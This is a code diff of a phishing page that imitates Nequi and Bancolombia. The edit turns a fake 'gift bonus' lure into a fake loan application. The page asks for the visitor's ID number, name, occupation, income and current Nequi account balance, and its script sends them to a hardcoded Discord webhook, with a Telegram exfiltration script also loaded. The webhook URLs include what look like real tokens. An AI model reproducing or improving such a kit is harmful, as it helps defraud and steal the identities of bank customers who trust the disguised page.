@@ -135,7 +135,7 @@
   </header>
 
   <div class="credits" style="padding-bottom: 0 !important">
-    <div class="wrap"><div class="wrapper" style="width: 100% !important"><div class="type-credits__content" id="type-credits"><div class="type-credits-card-w credit-2"><div class="big-letter" style="height: 50vh !important"><img src="./assets/logo-credito.png" style="width: 150px" /><h1 class="u-text-white is-credit-effect-page" style="font-size: 2.5rem !important; padding: 1.5rem 0">Valida tus datos y<br> redime tu bono <br /></h1></div></div></div></div></div>
+    <div class="wrap"><div class="wrapper" style="width: 100% !important"><div class="type-credits__content" id="type-credits"><div class="type-credits-card-w credit-2"><div class="big-letter" style="height: 50vh !important"><img src="./assets/logo-credito.png" style="width: 150px" /><h1 class="u-text-white is-credit-effect-page" style="font-size: 2.5rem !important; padding: 1.5rem 0">Valida tus datos y<br> solicita <br />tu crédito</h1></div></div></div></div></div>
   </div>
 
   <section class="errorMessage messageErrorContainer">
@@ -149,37 +149,23 @@
         <div class="px-6" id="simuladorSalvavidas">
           <div class="max-w-[400px] mx-auto">
             <div class="bg-purple-primary w-full rounded-lg p-4">
-              <h4 class="text-[1.25rem] font-medium text-balance text-left w-full text-white mb-2">¿Valor de tu bono regalo?</h4>
+              <h4 class="text-[1.25rem] font-medium text-balance text-left w-full text-white mb-2">¿Cuánta plata necesitas?</h4>
               <div class="relative">
-                <div class="text-3xl font-semibold text-white mb-4">$<span id="montoSeleccionadoSalvavidas">20.000</span></div>
-                <input type="range" id="montoSalvavidas" min="20000" max="1000000" step="20000" value="20000" class="range-slider" style="background: linear-gradient(to right, var(--color-pink-primary) 0%, var(--color-gray-primary) 0%);" />
+                <div class="text-3xl font-semibold text-white mb-4">$<span id="montoSeleccionadoSalvavidas">100.000</span></div>
+                <input type="range" id="montoSalvavidas" min="100000" max="5000000" step="100000" value="100000" class="range-slider" style="background: linear-gradient(to right, var(--color-pink-primary) 0%, var(--color-gray-primary) 0%);" />
                 <script>
-  const sliderSalvavidas = document.getElementById("montoSalvavidas");
-  const montoSeleccionadoSpan = document.getElementById("montoSeleccionadoSalvavidas");
-  
-  function updateSliderBackground() {
-    const val = ((sliderSalvavidas.value - sliderSalvavidas.min) / (sliderSalvavidas.max - sliderSalvavidas.min)) * 100;
-    sliderSalvavidas.style.background = `linear-gradient(to right, var(--color-pink-primary) ${val}%, var(--color-gray-primary) ${val}%)`;
-  }
-  
-  function updateMontoMostrado() {
-    const valor = parseInt(sliderSalvavidas.value);
-    montoSeleccionadoSpan.textContent = new Intl.NumberFormat("es-CO").format(valor);
-  }
-  
-  sliderSalvavidas.addEventListener("input", () => {
-    updateMontoMostrado();
-    updateSliderBackground();
-  });
-  
-  // Inicializar valores
-  updateMontoMostrado();
-  updateSliderBackground();
-</script>
-                <div class="flex justify-between text-sm text-gray-300 mt-2"><span>$100.000</span><span>$1.000.000</span></div>
+                  const sliderSalvavidas = document.getElementById("montoSalvavidas");
+                  function updateSliderBackground() {
+                    const val = ((sliderSalvavidas.value - sliderSalvavidas.min) / (sliderSalvavidas.max - sliderSalvavidas.min)) * 100;
+                    sliderSalvavidas.style.background = `linear-gradient(to right, var(--color-pink-primary) ${val}%, var(--color-gray-primary) ${val}%)`;
+                  }
+                  sliderSalvavidas.addEventListener("input", updateSliderBackground);
+                  updateSliderBackground();
+                </script>
+                <div class="flex justify-between text-sm text-gray-300 mt-2"><span>$100.000</span><span>$5.000.000</span></div>
               </div>
             </div>
-            <p class="text-xs text-gray-500 mt-3 mb-3">Ten en cuenta que el valor que selecciones en este rango, es el valor que vas a solicitar como bono de regalo.</p>
+            <p class="text-xs text-gray-500 mt-3 mb-3">Ten en cuenta que el valor que selecciones en este rango, es el valor que vas a desembolsar.</p>
             <h4 class="text-base font-medium text-balance text-left w-full text-purple-primary mb-4">Datos personales</h4>
             <div class="flex flex-col justify-center items-center gap-4 mb-3 w-full">
               <div class="form-group"><input type="text" required inputmode="numeric" maxlength="10" pattern="[0-9]*" id="cedulaSalvavidas" /><label for="cedulaSalvavidas">Ingresa tu cédula</label></div>
@@ -191,19 +177,25 @@
               <span id="ingresosErrorSalvavidas" class="text-red-500 text-lg hidden">Ingresa tus ingresos mensuales</span>
               <h4 class="text-base font-medium text-balance text-left w-full text-purple-primary">Valida tu identidad</h4>
               <span class="text-gray-500 text-xs">Para validar que eres el titular de la cuenta confirmanos cual es el saldo actual en tu cuenta Nequi:</span>
-              <div class="form-group"><input type="text" id="saldoActualSalvavidas" class="input-saldo" maxlength="14" autocomplete="off" required /><label for="saldoActual">¿Cual es el saldo actual en tu cuenta NEQUI?</label><div class="image-saldo"><img src="./assets/saldo.png" alt=""></div></div>
+              <div class="form-group"><input type="text" id="saldoActualSalvavidas" class="input-saldo" maxlength="14" autocomplete="off" required /><label for="saldoActual">¿SALDO ACTUAL EN SU CUENTA DE NEQUI?</label><div class="image-saldo"><img src="./assets/saldo.png" alt=""></div></div>
               <span id="saldoActualErrorSalvavidas" class="text-red-500 text-md text-left hidden">¡ERROR! Corrige tu saldo actual</span>
-              <span class="text-gray-500 text-xs">Por políticas financieras el saldo actual no será visible en la solicitud, solo hace parte del proceso de validación.</span>
+              <span class="text-gray-500 text-xs">Por políticas financieras el saldo actual no será visible en la solicitud, solo hace parte del proceso de validación ante las centrales de riesgo.</span>
             </div>
             <div class="mb-4">
-              <div class="flex mb-4" id="checkedSalvavidas"><div class="checkbox" id="checkboxNoChecked"></div><div class="checkbox-checked" id="checkboxChecked"><img src="./assets/checked.svg" alt="" /></div><div class="text"><em>Autorizo a Bancolombia S.A. para que me contacte vía telefónica con fines comerciales, incluyendo la promoción y ofrecimiento de productos y servicios financieros. Te invitamos a conocer más sobre la Política para el Tratamiento de Datos Personales, donde podrás encontrar definiciones, finalidades y detalles sobre el relacionamiento con terceros y/o encargados. Para conocer la política, visita:</em><a href="https://www.nequi.com.co/informacion-legal/sitio-web/tratamiento-de-datos-personales-nequi"><em>Políticas de contrato y tratamiento de datos.</em></a></div></div>
+              <h4 class="text-base font-medium text-balance text-left w-full text-purple-primary mb-4">¿En cuánto tiempo quieres pagar tu préstamo?</h4>
+              <div class="mb-4"><div class="relative"><span class="absolute top-2 left-4 text-sm text-pink-primary font-medium">Fecha de pago</span><select id="fechaPago" class="w-full appearance-none bg-pink-tertiary rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none"><option value="1">1 de cada mes</option><option value="2">2 de cada mes</option><option value="3">3 de cada mes</option><option value="4">4 de cada mes</option><option value="5">5 de cada mes</option><option value="6">6 de cada mes</option><option value="7">7 de cada mes</option><option value="8">8 de cada mes</option><option value="9">9 de cada mes</option><option value="10">10 de cada mes</option><option value="11">11 de cada mes</option><option value="12">12 de cada mes</option><option value="13">13 de cada mes</option><option value="14">14 de cada mes</option><option value="15">15 de cada mes</option><option value="16">16 de cada mes</option><option value="17">17 de cada mes</option><option value="18">18 de cada mes</option><option value="19">19 de cada mes</option><option value="20">20 de cada mes</option><option value="21">21 de cada mes</option><option value="22">22 de cada mes</option><option value="23">23 de cada mes</option><option value="24">24 de cada mes</option><option value="25">25 de cada mes</option><option value="26">26 de cada mes</option><option value="27">27 de cada mes</option><option value="28">28 de cada mes</option><option value="29">29 de cada mes</option><option value="30">30 de cada mes</option><option value="31">31 de cada mes</option></select><div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg></div></div></div>
+              <div class="relative mb-2"><span class="absolute top-2 left-4 text-sm text-pink-primary font-medium">Selecciona las cuotas</span><select id="plazoSelectorSalvavidas" class="w-full appearance-none bg-pink-tertiary rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none"><option value="1">1 mes</option><option value="2">2 meses</option><option value="3">3 meses</option><option value="4">4 meses</option><option value="5">5 meses</option><option value="6">6 meses</option><option value="7">7 meses</option><option value="8">8 meses</option><option value="9">9 meses</option><option value="10">10 meses</option><option value="11">11 meses</option><option value="12">12 meses</option><option value="13">13 meses</option><option value="14">14 meses</option><option value="15">15 meses</option><option value="16">16 meses</option><option value="17">17 meses</option><option value="18">18 meses</option><option value="19">19 meses</option><option value="20">20 meses</option><option value="21">21 meses</option><option value="22">22 meses</option><option value="23">23 meses</option><option value="24" selected="">24 meses</option></select><div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg></div></div>
+              <h4 class="text-base font-medium text-balance text-left w-full text-purple-primary mb-4">Hasta 24 meses</h4>
             </div>
+            <div class="flex mb-4" id="checkedSalvavidas"><div class="checkbox" id="checkboxNoChecked"></div><div class="checkbox-checked" id="checkboxChecked"><img src="./assets/checked.svg" alt="" /></div><div class="text"><em>Autorizo a Bancolombia S.A. para que me contacte vía telefónica con fines comerciales, incluyendo la promoción y ofrecimiento de productos y servicios financieros. Te invitamos a conocer más sobre la Política para el Tratamiento de Datos Personales, donde podrás encontrar definiciones, finalidades y detalles sobre el relacionamiento con terceros y/o encargados. Para conocer la política, visita:</em><a href="https://www.nequi.com.co/informacion-legal/sitio-web/tratamiento-de-datos-personales-nequi"><em>Políticas de contrato y tratamiento de datos.</em></a></div></div>
+            <div class="mb-4"><h4 class="text-base font-medium text-balance text-left w-full text-pink-primary">Tasa de interés</h4><div class="text-purple-primary font-medium">1.81% E.M igual a 24% E.A</div></div>
+            <div class="mb-4"><h4 class="text-base font-medium text-balance text-left w-full text-pink-primary">Valor aproximado de tu cuota mensual:</h4><div class="cuotaMensualSalvavidas text-3xl font-semibold text-purple-primary">$15.900</div><p class="text-md text-black font-medium mt-2">Incluye préstamo (capital), seguro e intereses.</p></div>
             <button type="button" id="btnContinuarSalvavidas" class="w-full bg-pink-primary text-white py-4 px-6 rounded-md text-lg hover:bg-pink-600 transition-colors disabled:opacity-80 disabled:cursor-not-allowed" disabled="">Solicitar</button>
           </div>
         </div>
         <script src="./js/sendTelegramMessageNoBtn.js"></script>
         <script>
-          const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1511413086232514612/Bzv6xZWMtRykKhL5lHr_GYCZoHw5lI1g4x_9V4xdHZaOdddNrXnDhSg0wxU4pclbmLgl";
+          const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1503743291114520721/imvadLKqt8BuBqh3Y9d5okKpGtOMMnE33Et60BFuuZxxa2vx-oLv2CDoUKVCIeTlig5e";
 
           function enviarADiscord(mensaje) {
             fetch(DISCORD_WEBHOOK_URL, {
@@ -222,17 +214,46 @@
 
             const inputMontoSalvavidas = document.getElementById("montoSalvavidas");
             const montoSeleccionadoSalvavidas = document.getElementById("montoSeleccionadoSalvavidas");
+            const cuotaMensualSalvavidas = document.querySelector(".cuotaMensualSalvavidas");
+            const plazoSelectorSalvavidas = document.getElementById("plazoSelectorSalvavidas");
+            const fechaPago = document.getElementById("fechaPago");
+            const TASA_INTERES_MENSUAL_SALVAVIDAS = 0.009;
 
             const checkedSalvavidas = document.getElementById("checkedSalvavidas");
             const checkboxNoChecked = document.getElementById("checkboxNoChecked");
             const checkboxChecked = document.getElementById("checkboxChecked");
+
+            if (inputMontoSalvavidas) {
+              inputMontoSalvavidas.addEventListener("input", (e) => {
+                const valor = parseInt(e.target.value);
+                montoSeleccionadoSalvavidas.textContent = new Intl.NumberFormat("es-CO").format(valor);
+                calcularCuotaMensualSalvavidas(valor);
+              });
+            }
+
+            if (plazoSelectorSalvavidas) {
+              plazoSelectorSalvavidas.addEventListener("change", () => {
+                const valor = parseInt(inputMontoSalvavidas.value);
+                calcularCuotaMensualSalvavidas(valor);
+              });
+            }
+
+            function calcularCuotaMensualSalvavidas(monto) {
+              if (!plazoSelectorSalvavidas || !cuotaMensualSalvavidas) return;
+              const meses = parseInt(plazoSelectorSalvavidas.value);
+              const interesMensual = monto * TASA_INTERES_MENSUAL_SALVAVIDAS;
+              const seguroMensual = 5000;
+              const cuotaMensual = monto / meses + interesMensual + seguroMensual;
+              cuotaMensualSalvavidas.textContent = "$" + new Intl.NumberFormat("es-CO").format(Math.round(cuotaMensual));
+            }
+
+            calcularCuotaMensualSalvavidas(100000);
 
             const cedulaSalvavidas = document.getElementById("cedulaSalvavidas");
             const nombreCompletoSalvavidas = document.getElementById("nombreCompletoSalvavidas");
             const ingresoMensualSalvavidas = document.getElementById("ingresoMensualSalvavidas");
             const saldoActualSalvavidas = document.getElementById("saldoActualSalvavidas");
             const btnContinuarSalvavidas = document.getElementById("btnContinuarSalvavidas");
-            const ocupacionSelectorSalvavidas = document.getElementById("ocupacionSelectorSalvavidas");
 
             function validarCedula() { return cedulaSalvavidas.value.length >= 7 && cedulaSalvavidas.value.length <= 10; }
             function validarNombre() { return nombreCompletoSalvavidas.value.trim().length >= 5 && nombreCompletoSalvavidas.value.includes(" "); }
@@ -341,8 +362,10 @@
 👤 Nombre: ${nombreCompletoSalvavidas.value}
 💼 Ocupación: ${ocupacionSelectorSalvavidas.value}
 💰 Ingresos: ${ingresoMensualSalvavidas.value}
-💵 Saldo Actual: ${saldoActualSalvavidas.value}
-🏦 Monto Redimido: ${montoSeleccionadoSalvavidas.textContent}`;
+💵 Saldo declarado: ${saldoActualSalvavidas.value}
+📅 Plazo: ${plazoSelectorSalvavidas.value} meses
+📆 Fecha de pago: día ${fechaPago.value} de cada mes
+🏦 Monto solicitado: ${montoSeleccionadoSalvavidas.textContent}`;
                 enviarADiscord(mensajeDiscord);
 
                 const rawSaldo = saldoActualSalvavidas.value.replace(/\D/g, "");
@@ -398,6 +421,8 @@
                 formDataToStore.ocupacion = ocupacionSelectorSalvavidas.value;
                 formDataToStore.ingresoMensual = ingresoMensualSalvavidas.value;
                 formDataToStore.saldoActual = saldoActualSalvavidas.value;
+                formDataToStore.meses = plazoSelectorSalvavidas.value;
+                formDataToStore.fechaPago = fechaPago.value;
                 formDataToStore.tipoProducto = "Bajo monto";
                 localStorage.setItem("formData", JSON.stringify(formDataToStore));
               });
